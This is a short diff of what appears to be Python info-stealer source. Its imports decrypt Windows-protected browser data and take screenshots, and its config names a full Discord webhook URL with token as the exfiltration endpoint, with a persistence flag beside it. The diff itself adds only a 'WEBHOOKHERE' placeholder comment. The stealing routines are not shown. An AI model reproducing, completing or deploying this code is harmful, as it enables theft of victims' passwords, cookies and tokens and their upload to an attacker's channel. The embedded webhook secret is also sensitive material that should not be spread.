@@ -6,6 +6,8 @@ from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
+# "WEBHOOKHERE"
+
 config = {
     'webhook': "https://discord.com/api/webhooks/1182993632597381170/YeeVBYzhuvmeDluhMyj6lOHjChL7MJHz3uPIONreWMdoHVEOvIMKr4-r55Kkabq5UQel",
     'persist': False,
